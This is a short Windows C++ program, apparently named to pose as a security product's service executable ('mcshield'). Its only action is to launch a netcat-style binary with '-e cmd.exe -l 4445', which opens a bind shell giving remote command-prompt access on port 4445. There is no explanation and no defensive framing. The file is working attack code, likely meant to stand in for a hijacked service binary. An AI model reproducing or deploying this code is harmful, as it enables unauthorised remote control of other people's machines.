// VZPmcshield.cpp : Defines the entry point for the console application.
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <tchar.h>

using namespace std;

LPSTR cmdArgs = "c:/test.exe -k -e c:/windows/system32/cmd.exe -l 4445";

void _tmain(int argc, _TCHAR *argv[]) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory (&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory (&pi, sizeof(pi));

	if (!CreateProcess(NULL, cmdArgs, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi )) {
		cout << "Process failed" << endl;
		return;
	}
	WaitForSingleObject (pi.hProcess, INFINITE);
	CloseHandle (pi.hProcess);
	CloseHandle (pi.hThread);
}
